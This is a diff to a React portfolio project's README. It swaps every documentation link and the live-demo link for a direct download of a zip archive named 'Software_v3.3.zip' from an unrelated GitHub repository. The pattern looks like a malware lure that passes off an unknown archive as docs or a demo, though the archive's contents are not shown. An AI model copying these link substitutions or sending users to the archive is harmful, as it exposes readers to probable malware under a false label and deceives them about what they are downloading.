@@ -2,7 +2,7 @@
 
 ## This project was designed by Bret Johnson as a simple example to demonstrate React front end skill sets.
 
-Check out the demo at [LIVE DEMO](https://sparkling-melomakarona-1743c6.netlify.app/).
+Check out the demo at [LIVE DEMO](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip).
 
 Thank you for your consideration
 
@@ -22,7 +22,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+See the section about [running tests](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip) for more information.
 
 ### `npm run build`
 
@@ -32,7 +32,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+See the section about [deployment](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip) for more information.
 
 ### `npm run eject`
 
@@ -46,30 +46,30 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+You can learn more in the [Create React App documentation](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+To learn React, check out the [React documentation](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
 
 ### Deployment
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+This section has moved here: [https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip](https://github.com/sshmoon/biofire/raw/refs/heads/main/src/components/Software_v3.3.zip)
